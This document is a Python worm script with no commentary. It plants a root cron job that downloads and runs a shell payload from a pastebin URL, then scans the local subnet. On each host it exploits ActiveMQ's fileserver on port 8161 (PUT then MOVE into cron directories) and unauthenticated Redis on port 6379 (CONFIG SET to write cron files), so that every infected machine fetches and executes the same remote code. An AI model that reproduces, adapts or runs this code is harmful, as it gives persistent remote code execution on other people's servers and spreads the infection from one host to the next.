#! /usr/bin/env python
#coding: utf-8

import threading
import socket
from re import findall
import httplib
import os

IP_LIST = []

class scanner(threading.Thread):
    tlist = []
    maxthreads = 10
    evnt = threading.Event()
    lck = threading.Lock()

    def __init__(self,host):
        threading.Thread.__init__(self)
        self.host = host
    def run(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect_ex((self.host, 8161))
            s.send('google spider\r\n')
            results = s.recv(1)
            if str(results):
                data = "*/1 * * * * root (curl -fsSL https://pastebin.com/raw/1NtRkBc3||wget -q -O- https://pastebin.com/raw/1NtRkBc3)|sh\n##"
                data2 = "*/1 * * * * (curl -fsSL https://pastebin.com/raw/1NtRkBc3||wget -q -O- https://pastebin.com/raw/1NtRkBc3)|sh\n##"
                conn = httplib.HTTPConnection(self.host, port=8161, timeout=2)
                conn.request(method='PUT', url='/fileserver/go.txt', body=data)
                conn.request(method='PUT', url='/fileserver/goa.txt', body=data2)
                conn.request(method='PUT', url='/fileserver/gob.txt', body=data2)
                result = conn.getresponse()
                conn.close()
                if result.status == 204:
                    headers = {'Destination': 'file:///etc/cron.d/root'}
                    headers2 = {'Destination': 'file:///var/spool/cron/root'}
                    headers3 = {'Destination': 'file:///var/spool/cron/crontabs/root'}
                    conn = httplib.HTTPConnection(self.host, port=8161, timeout=2)
                    conn.request(method='MOVE', url='/fileserver/go.txt', headers=headers)
                    conn.request(method='MOVE', url='/fileserver/goa.txt', headers=headers2)
                    conn.request(method='MOVE', url='/fileserver/gob.txt', headers=headers3)
                    conn.close()
                    s.close()
        except Exception:
            pass
        try:
            s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s2.settimeout(2)
            s2.connect_ex((self.host, 6379))
            s2.send('set backuper1 "\\n\\n\\n*/1 * * * * root (curl -fsSL https://pastebin.com/raw/1NtRkBc3||wget -q -O- https://pastebin.com/raw/1NtRkBc3)|sh\\n\\n\\n"\r\n')
            s2.send('set backuper2 "\\n\\n\\n*/1 * * * * (curl -fsSL https://pastebin.com/raw/1NtRkBc3||wget -q -O- https://pastebin.com/raw/1NtRkBc3)|sh\\n\\n\\n"\r\n')
            s2.send('config set dir /etc/cron.d/\r\n')
            s2.send('config set dbfilename root\r\n')
            s2.send('save\r\n')
            s2.send('config set dir /var/spool/cron/\r\n')
            s2.send('config set dbfilename root\r\n')
            s2.send('save\r\n')
            s2.send('config set dir /var/spool/cron/crontabs/\r\n')
            s2.send('config set dbfilename root\r\n')
            s2.send('save\r\n')
            s2.close()
        except Exception:
            pass
        scanner.lck.acquire()
        scanner.tlist.remove(self)
        if len(scanner.tlist) < scanner.maxthreads:
            scanner.evnt.set()
            scanner.evnt.clear()
            scanner.lck.release()

    def newthread(host):
        scanner.lck.acquire()
        sc = scanner(host)
        scanner.tlist.append(sc)
        scanner.lck.release()
        sc.start()

    newthread = staticmethod(newthread)

def get_ip_list():
    try:
        url = 'ident.me'
        conn = httplib.HTTPConnection(url, port=80, timeout=10)
        conn.request(method='GET', url='/', )
        result = conn.getresponse()
        ip = result.read()
        ips = findall(r'\d+.\d+.\d+.', ip)[0]
        for i in range(1, 256):
            IP_LIST.append(ips + (str(i)))
    except Exception:
        ip = os.popen("/sbin/ifconfig -a|grep inet|grep -v 127.0.0.1|grep -v inet6|awk '{print $2}'|tr -d \"addr:\"").readline().rstrip()
        ips = findall(r'\d+.\d+.\d+.', ip)[0]
        for i in range(1, 256):
            IP_LIST.append(ips + (str(i)))
        pass

def runPortscan():
    get_ip_list()
    for host in IP_LIST:
        scanner.lck.acquire()
        if len(scanner.tlist) >= scanner.maxthreads:
            scanner.lck.release()
            scanner.evnt.wait()
        else:
            scanner.lck.release()
            scanner.newthread(host)
    for t in scanner.tlist:
        t.join()

if __name__ == "__main__":
    f = open('/etc/cron.d/system', 'w')
    f.write('*/35 * * * * root (curl -fsSL https://pastebin.com/raw/1NtRkBc3||wget -q -O- https://pastebin.com/raw/1NtRkBc3)|sh\n##')
    f.close()
    runPortscan()

